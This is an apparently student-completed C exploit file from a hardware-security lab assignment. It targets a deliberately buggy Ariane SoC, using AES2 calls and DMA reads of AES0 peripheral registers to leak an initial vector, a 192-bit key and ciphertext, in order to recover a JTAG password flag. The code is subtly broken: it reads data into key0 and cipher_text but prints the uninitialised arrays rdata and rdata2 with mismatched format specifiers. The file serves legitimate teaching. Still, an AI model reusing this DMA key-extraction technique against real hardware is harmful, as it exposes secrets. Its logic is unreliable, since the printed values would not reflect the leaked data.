/////////////////////////////////////////////////////////////////////////////////////////////////////
//
//  - This is the template program file for exploit E4.
//  - Check the Appendix B of assignment manual for more details about the bug and
//    how the exploit is constructed.
//
//  - Command to run this file: ./make_run_user_with_pk.sh exploit4
//
//  - Submit the updated version of this file along with your pdf report.
//  - This report should be executable on the buggy SoC provided to you.
//  - Add comments where ever needed. Your program file will not be evaluated
//    without the comments.
//  - Search for the word 'EDIT' to find all the places where you need to edit
//    this file to complete the exploit
//
/////////////////////////////////////////////////////////////////////////////////////////////////////
//
//  - The flag for exploit 4 is the JTAG password used by the kernel code
//
/////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

#include "ariane_api.h"  // includes all the API functions to access the peripherals



//////////////////////////////////
//
// Main function that runs the exploit
//
//////////////////////////////////
void main(void)
{
	printf("Running exploit 4\n");

    //////////////////////////////////
    // Generate a unique ID per student per exploit
    //////////////////////////////////

    char student_name[] = "Daniel Horan" ; // EDIT: replace the string with your first and last names

    print_student_id(student_name, 4);


    //////////////////////////////////
    //  Run the exploit
    //  - The exploit successfully recovers the data used by the kernel function, 'kernel_func2'
    //////////////////////////////////

    //////////////////////////////////
    // Recover the initial vector like we extracted the kernel data in case of exploit 3
    //////////////////////////////////
		//setting the pointer 'pt' to a specific memory address, obtained from diag.dump, where kernel data for the initial vector is stored.
		//this address is used to retrieve the initial vector through the AES2 encryption and decryption process.
    uint32_t *pt = (uint32_t *)0x80009bf8;  // EDIT: get the location where the kernel data for initial vector is stored


    uint32_t initial_vector[4]; //placeholder for the initial vector

                                 // its data in the executable
                                 // this is similar to how we found the address in exploit 3
    uint32_t st[4]  = {0x2fde7038, 0x86532086, 0xfbbcb72c, 0x540578e0}; // some initial vector to do the encryption
    uint32_t ct[AES2_CT_WORDS];  //edited: place holders for storing encrypted data
    uint32_t pt2[AES2_CT_WORDS]; //edited: place holders for storing decrypted data

    uint32_t key_sel = 0; // selecting key 0

    //EDIT: perform the encryption and decryption using AES2 like we did in exploit3 to get the initial vector

		//encrypting data at 'pt' using AES2 to retrieve the initial vector indirectly.
		//this 'dummy' encryption is necessary to access the initial vector used by the kernel function, 'kernel_func2'.
    aes2_encrypt(pt, st, ct, key_sel);
		//decrypting the data back to retrieve the original initial vector.
		//this step is crucial to obtain the initial vector which was used in the kernel function for further processing.
    aes2_decrypt(ct, st, pt2, key_sel);

    // print the plain txt from AES as output. This is the initial vector used by the kernel_func2
    printf("Initial vector = %08x %08x %08x %08x\n", pt2[0], pt2[1], pt2[2], pt2[3]);


    //////////////////////////////////
    // Recover the Key0 from AES0
    //////////////////////////////////
    uint64_t rdata[6]; // DMA reads 32 bits at a time but returns them
                       // as 64 bit by extending 32 bit data with 0's
                       // thats why array is 64 bit integers

    // EDIT: read the value from AES0 register address space such that we leak its Key0 similar
    // to how we did for exploit2 using the dma transfer from peripheral function
    // The base address of AES0 is AES0_BASE
    // Note that AES0 key size is 6 32-bit words while the size of AES2's keys was 4 32-bit words

		//setting the address for the AES0 key
		//the offset is chosen to target the start of the Key0 in the AES0 peripheral.
    uint64_t aes0_key_addr = AES0_BASE + 5 * 8;

    uint32_t key0[6];
		//performing a DMA transfer to read the AES0 key from the calculated address into the 'key0' array.
		//this operation exploits the vulnerability to extract the 192-bit Key0 from AES0
    dma_transfer_from_perif(aes0_key_addr, key0, 6, 1);

    // print the values read
    printf("AES0 key = %08x %08x %08x %08x %08x %08x\n", rdata[0], rdata[1], rdata[2], rdata[3], rdata[4], rdata[5]);


    //////////////////////////////////
    // Recover the ciphered text from AES0
    // we will only be running the attacker_code function of exploit1 since the user_code function
    // is already run by the kernel_func2
    //////////////////////////////////

    uint64_t rdata2[4]; // DMA reads 32 bits at a time but returns them
                       // as 64 bit by extending 32 bit data with 0's
                       // thats why array is 64 bit integers

    // EDIT: read the cipher text data from the AES0 peripheral using DMA transfer from peripheral function.
    // this is similar to how we got the plain text using attack_code function in exploit1 from AES2.
    // but, in this case, we need to get the cipher text from AES0. Make sure you use the correct offset that will point to
    // the 'ct' register in aes0_wrapper.sv
    // the base address to the registers of AES0 is provided as AES0_BASE in the header files

		//calculating the address for the AES0 cipher text
		//this offset is chosen to target the start of the cipher text register in the AES0 peripheral.
    uint64_t aes0_ct_addr = AES0_BASE + 12 * 8;

    uint32_t cipher_text[4];
		//executing a DMA transfer to read the cipher text from the AES0 peripheral into the 'cipher_text' array.
		//this operation is crucial for retrieving the encrypted data which is essential for the next step of the exploit.
    dma_transfer_from_perif(aes0_ct_addr, cipher_text, 4, 1);

    // printing cipher text
    printf("Cipher text = %08x %08x %08x %08x \n", rdata2[0], rdata2[1], rdata2[2], rdata2[3]);


    // EDIT: after you get all the values by running this C code, use a offline AES encryption engine as mentioned in the lab manual to get
    // the flag which is the JTAG password.
    // So, for this edit, you wont be writing any C code here, instead you will be running that offline encryption engine on your browser.
    // include screenshots of that engine in your report along with the fake_uart.log for this exploit

    return;
}
